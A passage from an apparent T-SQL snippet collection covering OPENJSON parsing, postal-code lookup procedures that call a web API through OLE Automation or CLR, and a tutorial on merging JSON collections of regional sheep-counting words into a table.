  {  "LocationID": "20", "Name": "Frame Welding", "CostRate": "25.00", "Availability": "108.00",
     "ModifiedDate": "01 June 2002 00:00:00"},
  {   "LocationID": "30", "Name": "Debur and Polish", "CostRate": "14.50", "Availability": "120.00",
     "ModifiedDate": "01 June 2002 00:00:00"},
  {   "LocationID": "40", "Name": "Paint", "CostRate": "15.75", "Availability": "120.00",
     "ModifiedDate": "01 June 2002 00:00:00"},
  {  "LocationID": "45", "Name": "Specialized Paint", "CostRate": "18.00",  "Availability": "80.00",
     "ModifiedDate": "01 June 2002 00:00:00"},
  {  "LocationID": "50", "Name": "Subassembly", "CostRate": "12.25", "Availability": "120.00",
     "ModifiedDate": "01 June 2002 00:00:00"},
  {  "LocationID": "60", "Name": "Final Assembly", "CostRate": "12.25", "Availability": "120.00",
     "ModifiedDate": "01 June 2002 00:00:00" }
  ]
   ')
    WITH
      (LocationID INT '$.LocationID', Name VARCHAR(100) '$.Name', CostRate MONEY '$.CostRate',
      Availability DECIMAL(8, 2) '$.Availability', ModifiedDate DATETIME '$.ModifiedDate'
      )







https://en.dirceuresende.com/blog/sql-server-2016-how-to-query-information-from-a-zip-code-using-the-bemean-api-and-json_value-function/


CREATE PROCEDURE dbo.stpConsulta_CEP_OLE (
    @Nr_CEP VARCHAR(20)
)
AS BEGIN
 
    --------------------------------------------------------------------------------
    -- Habilitando o OLE Automation (Se não estiver ativado)
    --------------------------------------------------------------------------------
 
    DECLARE @Fl_Ole_Automation_Ativado BIT = (SELECT (CASE WHEN CAST([value] AS VARCHAR(MAX)) = '1' THEN 1 ELSE 0 END) FROM sys.configurations WHERE [name] = 'Ole Automation Procedures')
 
    IF (@Fl_Ole_Automation_Ativado = 0)
    BEGIN
 
        EXECUTE SP_CONFIGURE 'show advanced options', 1;
        RECONFIGURE WITH OVERRIDE;
    
        EXEC sp_configure 'Ole Automation Procedures', 1;
        RECONFIGURE WITH OVERRIDE;
    
    END
 
 
    DECLARE 
        @obj INT,
        @Url VARCHAR(255),
        @resposta VARCHAR(8000),
        @xml XML
 
 
    -- Recupera apenas os números do CEP
    DECLARE @startingIndex INT = 0
    
    WHILE (1=1)
    BEGIN
      
        SET @startingIndex = PATINDEX('%[^0-9]%', @Nr_CEP)  
        
        IF (@startingIndex <> 0)
            SET @Nr_CEP = REPLACE(@Nr_CEP, SUBSTRING(@Nr_CEP, @startingIndex, 1), '')  
        ELSE    
            BREAK
            
    END
    
    
    
    SET @Url = 'https://cep-bemean.herokuapp.com/api/br/' + @Nr_CEP
 
    EXEC sys.sp_OACreate 'MSXML2.ServerXMLHTTP', @obj OUT
    EXEC sys.sp_OAMethod @obj, 'open', NULL, 'GET', @Url, FALSE
    EXEC sys.sp_OAMethod @obj, 'send'
    EXEC sys.sp_OAGetProperty @obj, 'responseText', @resposta OUT
    EXEC sys.sp_OADestroy @obj
    
    SELECT
        JSON_VALUE(@resposta, '$.code') AS CEP,
        JSON_VALUE(@resposta, '$.address') AS Logradouro,
        JSON_VALUE(@resposta, '$.district') AS Bairro,
        JSON_VALUE(@resposta, '$.city') AS Cidade,
        JSON_VALUE(@resposta, '$.state') AS Estado
 
 
 
    --------------------------------------------------------------------------------
    -- Desativando o OLE Automation (Se não estava habilitado antes)
    --------------------------------------------------------------------------------
 
    IF (@Fl_Ole_Automation_Ativado = 0)
    BEGIN
 
        EXEC sp_configure 'Ole Automation Procedures', 0;
        RECONFIGURE WITH OVERRIDE;
 
        EXECUTE SP_CONFIGURE 'show advanced options', 0;
        RECONFIGURE WITH OVERRIDE;
 
    END
 
 
END


EXEC dbo.stpConsulta_CEP_OLE
    @Nr_CEP = '29200260' -- varchar(20)







	CREATE PROCEDURE dbo.stpConsulta_CEP_CLR (
    @Nr_CEP VARCHAR(20)
)
AS BEGIN
 
    -- Recupera apenas os números do CEP
    DECLARE @startingIndex INT = 0
    
    WHILE (1=1)
    BEGIN
      
        SET @startingIndex = PATINDEX('%[^0-9]%', @Nr_CEP)  
        
        IF (@startingIndex <> 0)
            SET @Nr_CEP = REPLACE(@Nr_CEP, SUBSTRING(@Nr_CEP, @startingIndex, 1), '')  
        ELSE    
            BREAK
            
    END
    
    
    DECLARE 
        @Url VARCHAR(500) = 'https://cep-bemean.herokuapp.com/api/br/' + @Nr_CEP,
        @resposta NVARCHAR(MAX);
 
 
    EXEC CLR.dbo.stpWs_Requisicao
        @Ds_Url = @Url , -- nvarchar(max)
        @Ds_Metodo = N'GET' , -- nvarchar(max)
        @Ds_Parametros = N'' , -- nvarchar(max)
        @Ds_Codificacao = N'UTF-8' , -- nvarchar(max)
        @Ds_Retorno_OUTPUT = @resposta OUTPUT -- nvarchar(max)
    
 
    SELECT
        JSON_VALUE(@resposta, '$.code') AS CEP,
        JSON_VALUE(@resposta, '$.address') AS Logradouro,
        JSON_VALUE(@resposta, '$.district') AS Bairro,
        JSON_VALUE(@resposta, '$.city') AS Cidade,
        JSON_VALUE(@resposta, '$.state') AS Estado
 
END


Transact-SQL
EXEC dbo.stpConsulta_CEP_CLR
    @Nr_CEP = '29200290' -- varchar(20)
1
2
EXEC dbo.stpConsulta_CEP_CLR
    @Nr_CEP = '29200290' -- varchar(20)


https://docs.qgis.org/testing/en/docs/user_manual/managing_data_source/opening_data.html









https://github.com/Phil-Factor/JsonUpsertToSQLServer/blob/master/JsonUpsert.sql



/* Importing JSON collections of documents into SQL Server is fairly easy if there is an underlying table schema
 to them. If the documents have  different schemas then you have little chance. Fortunately, this is rare
 Let's start this gently, putting simple collections into strings which we will insert into a table. 
 We'll use the example of sheep-counting words, collected from many different parts of Great Britain and 
 Brittany. The simple aim is to put them into a table */


IF Object_Id('SheepCountingWords','U') IS NOT NULL DROP TABLE SheepCountingWords
CREATE TABLE SheepCountingWords
  (
  Number INT NOT NULL,
  Word NVARCHAR(40) NOT NULL,
  Region NVARCHAR(40) NOT NULL,
  CONSTRAINT NumberRegionKey PRIMARY KEY  (Number,Region)
  );
GO

/* the quickest way to insert JSON into a table will always be the straight insert, 
even after an existence check. It is a good  practice to make the process idempotent 
by only inserting the records that don't already exist. I'll use the MERGE just to keep 
things simple, though the left outer join with a null check is faster. The MERGE is
far more convenient because it will accept a table-source such as a result from the
OpenJSON function */

IF EXISTS (SELECT * FROM tempdb.sys.objects WHERE name LIKE '#MergeJSONwithCountingTable%') DROP procedure #MergeJSONwithCountingTable
GO
CREATE PROCEDURE #MergeJSONwithCountingTable @json NVARCHAR(MAX),
  @source NVARCHAR(MAX)
/**
Summary: >
  This inserts, or updates, into a table (dbo.SheepCountingWords) a JSON string consisting 
  of sheep-counting words for  numbers between one and twenty used traditionally by sheep
  farmers in Gt Britain and Brittany. it allows records to be inserted or updated in any
  order or quantity.
  
Author: PhilFactor
Date: 20/04/2018
Database: CountingSheep
Examples:
   - EXECUTE #MergeJSONwithCountingTable @json=@OneToTen, @Source='Lincolnshire'
   - EXECUTE #MergeJSONwithCountingTable @Source='Lincolnshire', @json='[{
     "number": 11, "word": "Yan-a-dik"}, {"number": 12, "word": "Tan-a-dik"}]'
Returns: >
  nothing
**/
AS
MERGE dbo.SheepCountingWords AS target
USING
  (
  SELECT DISTINCT Number, Word, @source --duplicates cause 
    FROM --                         unique constraint violations
    OpenJson(@json)
    WITH (Number INT '$.number', Word VARCHAR(20) '$.word')
  ) AS source (Number, Word, Region)
ON target.Number = source.Number AND target.Region = source.Region
WHEN MATCHED AND (source.Word <> target.Word) THEN
  UPDATE SET target.Word = source.Word
WHEN NOT MATCHED THEN 
  INSERT (Number, Word, Region)
    VALUES
      (source.Number, source.Word, source.Region);
GO
/* now we try it out. Let's assemble a couple of simple json strings
from a table-source.*/

DECLARE @oneToTen NVARCHAR(MAX) =
	(
	SELECT LincolnshireCounting.number, LincolnshireCounting.word
	FROM
		(
		VALUES (1, 'Yan'), (2, 'Tan'), (3, 'Tethera'), (4, 'Pethera'),
		(5, 'Pimp'), (6, 'Sethera'), (7, 'Lethera'), (8, 'Hovera'),
		(9, 'Covera'), (10, 'Dik')
		) AS LincolnshireCounting (number, word)
	FOR JSON AUTO
	)

DECLARE @ElevenToTwenty NVARCHAR(MAX) =
    (
    SELECT LincolnshireCounting.number, LincolnshireCounting.word
    FROM
		(
		VALUES (11, 'Yan-a-dik'), (12, 'Tan-a-dik'), (13, 'Tethera-dik'),
		(14, 'Pethera-dik'), (15, 'Bumfit'), (16, 'Yan-a-bumtit'),
		(17, 'Tan-a-bumfit'), (18, 'Tethera-bumfit'),
		(19, 'Pethera-bumfit'), (20, 'Figgot')
		) AS LincolnshireCounting (number, word)
    FOR JSON AUTO
    )

/*this second query gives (formatted)...
[{
  "number": 11,  "word": "Yan-a-dik"
}, {
  "number": 12,  "word": "Tan-a-dik"
}, {
  "number": 13,  "word": "Tethera-dik"
}, {
  "number": 14,  "word": "Pethera-dik"
}, {
  "number": 15,  "word": "Bumfit"
}, {
  "number": 16,  "word": "Yan-a-bumtit"
}, {
  "number": 17,  "word": "Tan-a-bumfit"
}, {
  "number": 18,  "word": "Tethera-bumfit"
}, {
  "number": 19,  "word": "Pethera-bumfit"
}, {
  "number": 20,  "word": "Figgot"
}] 
which is easy to convert to a table source */


SELECT  Number, Word
    FROM
    OpenJson('[{
  "number": 11,  "word": "Yan-a-dik"
}, {
  "number": 12,  "word": "Tan-a-dik"
}, {
  "number": 13,  "word": "Tethera-dik"
}, {
  "number": 14,  "word": "Pethera-dik"
}, {
  "number": 15,  "word": "Bumfit"
}, {
  "number": 16,  "word": "Yan-a-bumtit"
}, {
  "number": 17,  "word": "Tan-a-bumfit"
}, {
  "number": 18,  "word": "Tethera-bumfit"
}, {
  "number": 19,  "word": "Pethera-bumfit"
}, {
  "number": 20,  "word": "Figgot"
}] '
)WITH (Number INT '$.number', Word VARCHAR(20) '$.word')

--Now we can EXECUTE the procedure to store them in the table
 
EXECUTE #MergeJSONwithCountingTable @json=@ElevenToTwenty, @Source='Lincolnshire'
EXECUTE #MergeJSONwithCountingTable @json=@OneToTen, @Source='Lincolnshire'
--and make sure that we are protected against duplicate inserts
EXECUTE #MergeJSONwithCountingTable @Source='Lincolnshire', @json='[{
  "number": 11, "word": "Yan-a-dik"}, {"number": 12, "word": "Tan-a-dik"}]'

SELECT * FROM SheepCountingWords
/*What if you want to import the sheep-counting words from several regions? This is 
OK for a collection that models a single table. However, real like isn't like that. 
Not even Sheep-Counting Words are like that. A little internalised 
Chris Date will be whispering in your ear that there are two relations here, a 
region and the name for a number. 
Your Javascipt will more likely be this (just reducing it to two numbers rather
than the twenty)
[{
   "region": "Wilts",
   "sequence": [{
      "number": 1,
      "word": "Ain"
   }, {
      "number": 2,
      "word": "Tain"
   }]
}, {
   "region": "Scots",
   "sequence": [{
      "number": 1,
      "word": "Yan"
   }, {
      "number": 2,
      "word": "Tyan"
   }]
}]
*/

SELECT DISTINCT Number, Word, Region
  FROM OpenJson(
'[{"region":"Wilts","sequence":[{"number":1,"word":"Ain"},{"number":2,"word":"Tain"}]},
{"region":"Scots","sequence":[{"number":1,"word":"Yan"},{"number":2,"word":"Tyan"}]}]')
WITH (Region NVARCHAR(30) N'$.region', sequence NVARCHAR(MAX) N'$.sequence' AS JSON)
    OUTER APPLY
  OpenJson(sequence) --to get the number and word within each array element 
  WITH (Number INT N'$.number', Word NVARCHAR(30) N'$.word')


IF EXISTS
  (
  SELECT *
    FROM tempdb.sys.objects
    WHERE objects.name LIKE '#MergeJSONWithEmbeddedArraywithCountingTable%'
  )
  DROP PROCEDURE #MergeJSONWithEmbeddedArraywithCountingTable;
GO
CREATE PROCEDURE #MergeJSONWithEmbeddedArraywithCountingTable @json NVARCHAR(MAX)
/**
Summary: >
  This inserts, or updates, into a table (dbo.SheepCountingWords) a JSON string consisting 
  of sheep-counting words for  numbers between one and twenty used traditionally by sheep
  farmers in Gt Britain and Brittany. it allows records to be inserted or updated in any
  order or quantity.
  
Author: PhilFactor
Date: 20/04/2018
Database: CountingSheep
Examples:
   - EXECUTE #MergeJSONWithEmbeddedArraywithCountingTable @json=@OneToTen, @Source='Lincolnshire'
   - EXECUTE #MergeJSONWithEmbeddedArraywithCountingTable @json='
     [{"region":"Wilts","sequence":[{"number":1,"word":"Ain"},{"number":2,"word":"Tain"}]},
     {"region":"Scots","sequence":[{"number":1,"word":"Yan"},{"number":2,"word":"Tyan"}]}]'
Returns: >
  nothing
**/
AS
MERGE dbo.SheepCountingWords AS target
USING
  (
  SELECT DISTINCT Number, Word, Region
  FROM OpenJson(@json) 
  WITH (Region NVARCHAR(30) N'$.region', sequence NVARCHAR(MAX) N'$.sequence' AS JSON)
    OUTER APPLY
  OpenJson(sequence)
  WITH (Number INT N'$.number', Word NVARCHAR(30) N'$.word')
  ) AS source (Number, Word, Region)
ON target.Number = source.Number AND target.Region = source.Region
WHEN MATCHED AND (source.Word <> target.Word) THEN
  UPDATE SET target.Word = source.Word
WHEN NOT MATCHED THEN INSERT (Number, Word, Region)
                      VALUES
                        (source.Number, source.Word, source.Region);
GO


/* and we can try it out easily */

EXECUTE #MergeJSONWithEmbeddedArraywithCountingTable '[{
   "region": "Wilts",
   "sequence": [{
      "number": 1,
      "word": "Ain"
   }, {
      "number": 2,
      "word": "Tain"
   }]
}, {
   "region": "Scots",
   "sequence": [{
      "number": 1,
      "word": "Yan"
   }, {
      "number": 2,
      "word": "Tyan"
   }]
}]'

DECLARE @json NVARCHAR(MAX)='[
   {
   "region": "Wilts",
   "sequence": [{
      "number": 1,
      "word": "Ain"
   }, {
      "number": 2,
      "word": "Tain"
   }]
},{
   "region": "Wilts",
   "sequence": [{
      "number": 1,
      "word": "Ain"
   }, {
      "number": 2,
      "word": "Tain"
   }]
}, {
   "region": "Scots",
   "sequence": [{
      "number": 1,
      "word": "Yan"
   }, {
      "number": 2,
      "word": "Tyan"
   }]
}]'
EXECUTE #MergeJSONWithEmbeddedArraywithCountingTable @json
go
/* so lets try a larger JSON collection */

DELETE FROM dbo.SheepCountingWords
DECLARE @AllRegions NVARCHAR(MAX) =
  '[{"region":"Wilts","sequence":[{"number":1,"word":"Ain"},{"number":2,"word":"Tain"},{"number":3,"word":"Tethera"},{"number":4,"word":"Methera"},{"number":5,"word":"Mimp"},{"number":6,"word":"Ayta"},{"number":7,"word":"Slayta"},{"number":8,"word":"Laura"},{"number":9,"word":"Dora"},{"number":10,"word":"Dik"},{"number":11,"word":"Ain-a-dik"},{"number":12,"word":"Tain-a-dik"},{"number":13,"word":"Tethera-a-dik"},{"number":14,"word":"Methera-a-dik"},{"number":15,"word":"Mit"},{"number":16,"word":"Ain-a-mit"},{"number":17,"word":"Tain-a-mit"},{"number":18,"word":"Tethera-mit"},{"number":19,"word":"Gethera-mit"},{"number":20,"word":"Ghet"}]},{"region":"Scots","sequence":[{"number":1,"word":"Yan"},{"number":2,"word":"Tyan"},{"number":3,"word":"Tethera"},{"number":4,"word":"Methera"},{"number":5,"word":"Pimp"},{"number":6,"word":"Sethera"},{"number":7,"word":"Lethera"},{"number":8,"word":"Hovera"},{"number":9,"word":"Dovera"},{"number":10,"word":"Dik"},{"number":11,"word":"Yanadik"},{"number":12,"word":"Tyanadik"},{"number":13,"word":"Tetheradik"},{"number":14,"word":"Metheradik"},{"number":15,"word":"Bumfitt"},{"number":16,"word":"Yanabumfit"},{"number":17,"word":"Tyanabumfitt"},{"number":18,"word":"Tetherabumfitt"},{"number":19,"word":"Metherabumfitt"},{"number":20,"word":"Giggot"}]},{"region":"Welsh","sequence":[{"number":1,"word":"Un"},{"number":2,"word":"Dau"},{"number":3,"word":"Tri"},{"number":4,"word":"Pedwar"},{"number":5,"word":"Pump"},{"number":6,"word":"Chwech"},{"number":7,"word":"Saith"},{"number":8,"word":"Wyth"},{"number":9,"word":"Naw"},{"number":10,"word":"Deg"},{"number":11,"word":"Un ar ddeg"},{"number":12,"word":"Deuddeg"},{"number":13,"word":"Tri ar ddeg"},{"number":14,"word":"Pedwar ar ddeg"},{"number":15,"word":"Pymtheg"},{"number":16,"word":"Un ar bymtheg"},{"number":17,"word":"Dau ar bymtheg"},{"number":18,"word":"Deunaw"},{"number":19,"word":"Pedwar ar bymtheg"},{"number":20,"word":"Ugain"}]},{"region":"Bowland","sequence":[{"number":1,"word":"Yain"},{"number":2,"word":"Tain"},{"number":3,"word":"Eddera"},{"number":4,"word":"Peddera"},{"number":5,"word":"Pit"},{"number":6,"word":"Tayter"},{"number":7,"word":"Layter"},{"number":8,"word":"Overa"},{"number":9,"word":"Covera"},{"number":10,"word":"Dix"},{"number":11,"word":"Yain-a-dix"},{"number":12,"word":"Tain-a-dix"},{"number":13,"word":"Eddera-a-dix"},{"number":14,"word":"Peddera-a-dix"},{"number":15,"word":"Bumfit"},{"number":16,"word":"Yain-a-bumfit"},{"number":17,"word":"Tain-a-bumfit"},{"number":18,"word":"Eddera-bumfit"},{"number":19,"word":"Peddera-a-bumfit"},{"number":20,"word":"Jiggit"}]},{"region":"Rathmell","sequence":[{"number":1,"word":"Aen"},{"number":2,"word":"Taen"},{"number":3,"word":"Tethera"},{"number":4,"word":"Fethera"},{"number":5,"word":"Phubs"},{"number":6,"word":"Aayther"},{"number":7,"word":"Layather"},{"number":8,"word":"Quoather"},{"number":9,"word":"Quaather"},{"number":10,"word":"Dugs"},{"number":11,"word":"Aena dugs"},{"number":12,"word":"Taena dugs"},{"number":13,"word":"Tethera dugs"},{"number":14,"word":"Fethera dugs"},{"number":15,"word":"Buon"},{"number":16,"word":"Aena buon"},{"number":17,"word":"Taena buon"},{"number":18,"word":"Tethera buon"},{"number":19,"word":"Fethera buon"},{"number":20,"word":"Gun a gun"}]},{"region":"Nidderdale","sequence":[{"number":1,"word":"Yain"},{"number":2,"word":"Tain"},{"number":3,"word":"Eddero"},{"number":4,"word":"Peddero"},{"number":5,"word":"Pitts"},{"number":6,"word":"Tayter"},{"number":7,"word":"Layter"},{"number":8,"word":"Overo"},{"number":9,"word":"Covero"},{"number":10,"word":"Dix"},{"number":11,"word":"Yaindix"},{"number":12,"word":"Taindix"},{"number":13,"word":"Edderodix"},{"number":14,"word":"Pedderodix"},{"number":15,"word":"Bumfit"},{"number":16,"word":"Yain-o-Bumfit"},{"number":17,"word":"Tain-o-Bumfit"},{"number":18,"word":"Eddero-Bumfit"},{"number":19,"word":"Peddero-Bumfit"},{"number":20,"word":"Jiggit"}]},{"region":"Swaledale","sequence":[{"number":1,"word":"Yan"},{"number":2,"word":"Tan"},{"number":3,"word":"Tether"},{"number":4,"word":"Mether"},{"number":5,"word":"Pip"},{"number":6,"word":"Azer"},{"number":7,"word":"Sezar"},{"number":8,"word":"Akker"},{"number":9,"word":"Conter"},{"number":10,"word":"Dick"},{"number":11,"word":"Yanadick"},{"number":12,"word":"Tanadick"},{"number":13,"word":"Tetheradick"},{"number":14,"word":"Metheradick"},{"number":15,"word":"Bumfit"},{"number":16,"word":"Yanabum"},{"number":17,"word":"Tanabum"},{"number":18,"word":"Tetherabum"},{"number":19,"word":"Metherabum"},{"number":20,"word":"Jigget"}]},{"region":"Teesdale","sequence":[{"number":1,"word":"Yan"},{"number":2,"word":"Tean"},{"number":3,"word":"Tether"},{"number":4,"word":"Mether"},{"number":5,"word":"Pip"},{"number":6,"word":"Lezar"},{"number":7,"word":"Azar"},{"number":8,"word":"Catrah"},{"number":9,"word":"Borna"},{"number":10,"word":"Dick"},{"number":11,"word":"Yan-a-dick"},{"number":12,"word":"Tean-a-dick"},{"number":13,"word":"Tether-dick"},{"number":14,"word":"Mether-dick"},{"number":15,"word":"Bumfit"},{"number":16,"word":"Yan-a-bum"},{"number":17,"word":"Tean-a-bum"},{"number":18,"word":"Tethera-bum"},{"number":19,"word":"Methera-bum"},{"number":20,"word":"Jiggit"}]},{"region":"Derbyshire","sequence":[{"number":1,"word":"Yain"},{"number":2,"word":"Tain"},{"number":3,"word":"Eddero"},{"number":4,"word":"Pederro"},{"number":5,"word":"Pitts"},{"number":6,"word":"Tayter"},{"number":7,"word":"Later"},{"number":8,"word":"Overro"},{"number":9,"word":"Coverro"},{"number":10,"word":"Dix"},{"number":11,"word":"Yain-dix"},{"number":12,"word":"Tain-dix"},{"number":13,"word":"Eddero-dix"},{"number":14,"word":"Peddero-dix"},{"number":15,"word":"Bumfitt"},{"number":16,"word":"Yain-o-bumfitt"},{"number":17,"word":"Tain-o-bumfitt"},{"number":18,"word":"Eddero-o-bumfitt"},{"number":19,"word":"Peddero-o-bumfitt"},{"number":20,"word":"Jiggit"}]},{"region":"Weardale","sequence":[{"number":1,"word":"Yan"},{"number":2,"word":"Teyan"},{"number":3,"word":"Tethera"},{"number":4,"word":"Methera"},{"number":5,"word":"Tic"},{"number":6,"word":"Yan-a-tic"},{"number":7,"word":"Teyan-a-tic"},{"number":8,"word":"Tethera-tic"},{"number":9,"word":"Methera-tic"},{"number":10,"word":"Bub"},{"number":11,"word":"Yan-a-bub"},{"number":12,"word":"Teyan-a-bub"},{"number":13,"word":"Tethera-bub"},{"number":14,"word":"Methera-bub"},{"number":15,"word":"Tic-a-bub"},{"number":16,"word":"Yan-tic-a-bub"},{"number":17,"word":"Teyan-tic-a-bub"},{"number":18,"word":"Tethea-tic-a-bub"},{"number":19,"word":"Methera-tic-a-bub"},{"number":20,"word":"Gigget"}]},{"region":"Tong","sequence":[{"number":1,"word":"Yan"},{"number":2,"word":"Tan"},{"number":3,"word":"Tether"},{"number":4,"word":"Mether"},{"number":5,"word":"Pick"},{"number":6,"word":"Sesan"},{"number":7,"word":"Asel"},{"number":8,"word":"Catel"},{"number":9,"word":"Oiner"},{"number":10,"word":"Dick"},{"number":11,"word":"Yanadick"},{"number":12,"word":"Tanadick"},{"number":13,"word":"Tetheradick"},{"number":14,"word":"Metheradick"},{"number":15,"word":"Bumfit"},{"number":16,"word":"Yanabum"},{"number":17,"word":"Tanabum"},{"number":18,"word":"Tetherabum"},{"number":19,"word":"Metherabum"},{"number":20,"word":"Jigget"}]},{"region":"Kirkby Lonsdale","sequence":[{"number":1,"word":"Yaan"},{"number":2,"word":"Tyaan"},{"number":3,"word":"Taed''ere"},{"number":4,"word":"Mead''ere"},{"number":5,"word":"Mimp"},{"number":6,"word":"Haites"},{"number":7,"word":"Saites"},{"number":8,"word":"Haoves"},{"number":9,"word":"Daoves"},{"number":10,"word":"Dik"},{"number":11,"word":"Yaan''edik"},{"number":12,"word":"Tyaan''edik"},{"number":13,"word":"Tead''eredik"},{"number":14,"word":"Mead''eredik"},{"number":15,"word":"Boon, buom, buum"},{"number":16,"word":"Yaan''eboon"},{"number":17,"word":"Tyaan''eboon"},{"number":18,"word":"Tead''ereboon"},{"number":19,"word":"Mead''ereboon"},{"number":20,"word":"Buom''fit, buum''fit"}]},{"region":"Wensleydale","sequence":[{"number":1,"word":"Yain"},{"number":2,"word":"Tain"},{"number":3,"word":"Eddero"},{"number":4,"word":"Peddero"},{"number":5,"word":"Pitts"},{"number":6,"word":"Tayter"},{"number":7,"word":"Later"},{"number":8,"word":"Overro"},{"number":9,"word":"Coverro"},{"number":10,"word":"Disc"},{"number":11,"word":"Yain disc"},{"number":12,"word":"Tain disc"},{"number":13,"word":"Ederro disc"},{"number":14,"word":"Peddero disc"},{"number":15,"word":"Bumfitt"},{"number":16,"word":"Bumfitt yain"},{"number":17,"word":"Bumfitt tain"},{"number":18,"word":"Bumfitt ederro"},{"number":19,"word":"Bumfitt peddero"},{"number":20,"word":"Jiggit"}]},{"region":"Derbyshire Dales","sequence":[{"number":1,"word":"Yan"},{"number":2,"word":"Tan"},{"number":3,"word":"Tethera"},{"number":4,"word":"Methera"},{"number":5,"word":"Pip"},{"number":6,"word":"Sethera"},{"number":7,"word":"Lethera"},{"number":8,"word":"Hovera"},{"number":9,"word":"Dovera"},{"number":10,"word":"Dick"},{"number":11,"word":""},{"number":12,"word":""},{"number":13,"word":""},{"number":14,"word":""},{"number":15,"word":""},{"number":16,"word":""},{"number":17,"word":""},{"number":18,"word":""},{"number":19,"word":""},{"number":20,"word":""}]},{"region":"Lincolnshire","sequence":[{"number":1,"word":"Yan"},{"number":2,"word":"Tan"},{"number":3,"word":"Tethera"},{"number":4,"word":"Pethera"},{"number":5,"word":"Pimp"},{"number":6,"word":"Sethera"},{"number":7,"word":"Lethera"},{"number":8,"word":"Hovera"},{"number":9,"word":"Covera"},{"number":10,"word":"Dik"},{"number":11,"word":"Yan-a-dik"},{"number":12,"word":"Tan-a-dik"},{"number":13,"word":"Tethera-dik"},{"number":14,"word":"Pethera-dik"},{"number":15,"word":"Bumfit"},{"number":16,"word":"Yan-a-bumfit"},{"number":17,"word":"Tan-a-bumfit"},{"number":18,"word":"Tethera-bumfit"},{"number":19,"word":"Pethera-bumfit"},{"number":20,"word":"Figgot"}]},{"region":"Southwest England ","sequence":[{"number":1,"word":"Yahn"},{"number":2,"word":"Tayn"},{"number":3,"word":"Tether"},{"number":4,"word":"Mether"},{"number":5,"word":"Mumph"},{"number":6,"word":"Hither"},{"number":7,"word":"Lither"},{"number":8,"word":"Auver"},{"number":9,"word":"Dauver"},{"number":10,"word":"Dic"},{"number":11,"word":"Yahndic"},{"number":12,"word":"Tayndic"},{"number":13,"word":"Tetherdic"},{"number":14,"word":"Metherdic"},{"number":15,"word":"Mumphit"},{"number":16,"word":"Yahna Mumphit"},{"number":17,"word":"Tayna Mumphit"},{"number":18,"word":"Tethera Mumphit"},{"number":19,"word":"Methera Mumphit"},{"number":20,"word":"Jigif"}]},{"region":"West Country Dorset","sequence":[{"number":1,"word":"Hant"},{"number":2,"word":"Tant"},{"number":3,"word":"Tothery"},{"number":4,"word":"Forthery"},{"number":5,"word":"Fant"},{"number":6,"word":"Sahny"},{"number":7,"word":"Dahny"},{"number":8,"word":"Downy"},{"number":9,"word":"Dominy"},{"number":10,"word":"Dik"},{"number":11,"word":"Haindik"},{"number":12,"word":"Taindik"},{"number":13,"word":"Totherydik"},{"number":14,"word":"Fotherydik"},{"number":15,"word":"Jiggen"},{"number":16,"word":"Hain Jiggen"},{"number":17,"word":"Tain Jiggen"},{"number":18,"word":"Tother Jiggen"},{"number":19,"word":"Fother Jiggen"},{"number":20,"word":"Full Score"}]},{"region":"Coniston","sequence":[{"number":1,"word":"Yan"},{"number":2,"word":"Taen"},{"number":3,"word":"Tedderte"},{"number":4,"word":"Medderte"},{"number":5,"word":"Pimp"},{"number":6,"word":"Haata"},{"number":7,"word":"Slaata"},{"number":8,"word":"Lowra"},{"number":9,"word":"Dowra"},{"number":10,"word":"Dick"},{"number":11,"word":"Yan-a-Dick"},{"number":12,"word":"Taen-a-Dick"},{"number":13,"word":"Tedder-a-Dick"},{"number":14,"word":"Medder-a-Dick"},{"number":15,"word":"Mimph"},{"number":16,"word":"Yan-a-Mimph"},{"number":17,"word":"Taen-a-Mimph"},{"number":18,"word":"Tedder-a-Mimph"},{"number":19,"word":"Medder-a-Mimph"},{"number":20,"word":"Gigget"}]},{"region":"Borrowdale","sequence":[{"number":1,"word":"Yan"},{"number":2,"word":"Tyan"},{"number":3,"word":"Tethera"},{"number":4,"word":"Methera"},{"number":5,"word":"Pimp"},{"number":6,"word":"Sethera"},{"number":7,"word":"Lethera"},{"number":8,"word":"Hovera"},{"number":9,"word":"Dovera"},{"number":10,"word":"Dick"},{"number":11,"word":"Yan-a-Dick"},{"number":12,"word":"Tyan-a-Dick"},{"number":13,"word":"Tethera-Dick"},{"number":14,"word":"Methera-Dick"},{"number":15,"word":"Bumfit"},{"number":16,"word":"Yan-a-bumfit"},{"number":17,"word":"Tyan-a-bumfit"},{"number":18,"word":"Tethera Bumfit"},{"number":19,"word":"Methera Bumfit"},{"number":20,"word":"Giggot"}]},{"region":"Eskdale","sequence":[{"number":1,"word":"Yaena"},{"number":2,"word":"Taena"},{"number":3,"word":"Teddera"},{"number":4,"word":"Meddera"},{"number":5,"word":"Pimp"},{"number":6,"word":"Seckera"},{"number":7,"word":"Leckera"},{"number":8,"word":"Hofa"},{"number":9,"word":"Lofa"},{"number":10,"word":"Dec"},{"number":11,"word":""},{"number":12,"word":""},{"number":13,"word":""},{"number":14,"word":""},{"number":15,"word":""},{"number":16,"word":""},{"number":17,"word":""},{"number":18,"word":""},{"number":19,"word":""},{"number":20,"word":""}]},{"region":"Westmorland","sequence":[{"number":1,"word":"Yan"},{"number":2,"word":"Tahn"},{"number":3,"word":"Teddera"},{"number":4,"word":"Meddera"},{"number":5,"word":"Pimp"},{"number":6,"word":"Settera"},{"number":7,"word":"Lettera"},{"number":8,"word":"Hovera"},{"number":9,"word":"Dovera"},{"number":10,"word":"Dick"},{"number":11,"word":"Yan Dick"},{"number":12,"word":"Tahn Dick"},{"number":13,"word":"Teddera Dick"},{"number":14,"word":"Meddera Dick"},{"number":15,"word":"Bumfit"},{"number":16,"word":"Yan-a-Bumfit"},{"number":17,"word":"Tahn-a 